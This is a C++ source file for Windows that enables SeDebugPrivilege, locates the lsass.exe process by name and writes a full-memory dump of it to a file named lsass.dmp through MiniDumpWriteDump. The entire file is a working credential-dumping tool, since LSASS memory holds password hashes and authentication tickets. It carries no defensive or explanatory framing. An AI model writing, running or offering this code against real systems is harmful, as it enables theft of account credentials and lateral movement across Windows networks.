#include <windows.h>
#include <processthreadsapi.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <iostream>
#include <shlwapi.h>
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "shlwapi.lib")

// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
// lpCmdLine, int nCmdShow) {
//
int FindTarget(const char* procname) {
        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;

        // Take a snapshot of all the processes currently running
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (INVALID_HANDLE_VALUE == hProcSnap)
                return 0;

        // PROCESSENTRY32 is a struct that holds process info
        // setting dwSize ensure the code works correctly on 32-bit and 64-bit envs
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Check if any processes are currently running
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }

        while (Process32Next(hProcSnap, &pe32)) {
                // lstrcmpiA ignore the capitalization of the process letters
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }

        CloseHandle(hProcSnap);

        return pid;
}
static void PrintLastError(const char* where) {
        DWORD e = GetLastError();
        char* msg = NULL;
        FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                           FORMAT_MESSAGE_IGNORE_INSERTS,
                       NULL, e, 0, (LPSTR)&msg, 0, NULL);
        printf("%s failed: %lu (%s)\n", where, e, msg ? msg : "no message");
        if (msg)
                LocalFree(msg);
}

BOOL setPrivilege(LPCTSTR privilegeName) {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                              &hToken)) {
                PrintLastError("OpenProcessToken");
                return FALSE;
        }

        LUID luid;
        if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
                PrintLastError("LookupPrivilegeValue");
                CloseHandle(hToken);
                return FALSE;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        SetLastError(0);
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
                PrintLastError("AdjustTokenPrivileges");
                CloseHandle(hToken);
                return FALSE;
        }

        // Important: AdjustTokenPrivileges can succeed but the privilege is not assigned.
        DWORD e = GetLastError();
        if (e == ERROR_NOT_ALL_ASSIGNED) {
                printf("AdjustTokenPrivileges: privilege '%s' not assigned to this token (run as "
                       "admin?)\n",
                       privilegeName);
                CloseHandle(hToken);
                return FALSE;
        }

        CloseHandle(hToken);
        return TRUE;
}

int main(void) {
        if (!setPrivilege(SE_DEBUG_NAME)) {
                printf("Cannot enable SeDebugPrivilege\n");
                return 1;
        }
        printf("SeDebugPrivilege enabled\n");

        const char* procname = "lsass.exe";

        int pid = FindTarget(procname);

        // Create a new file and get its handle
        HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                                   FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
                printf("CreateFile failed: %lu\n", GetLastError());
        }

        printf("PID: %u\n", pid);

        HANDLE hLsass = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, 0, pid);

        if (!hLsass) {
                printf("OpenProcess failed: %lu\n", GetLastError());
                CloseHandle(hFile);
        }

        BOOL dump = MiniDumpWriteDump((HANDLE)hLsass, (DWORD)pid, (HANDLE)hFile,
                                      MiniDumpWithFullMemory, NULL, NULL, NULL);

        if (!dump) {
                printf("The dump failed: %lu\n", GetLastError());
        } else {
                printf("The dump succeeded !!!!\n");
        }

        CloseHandle(hFile);
        CloseHandle(hLsass);

        return 0;
}
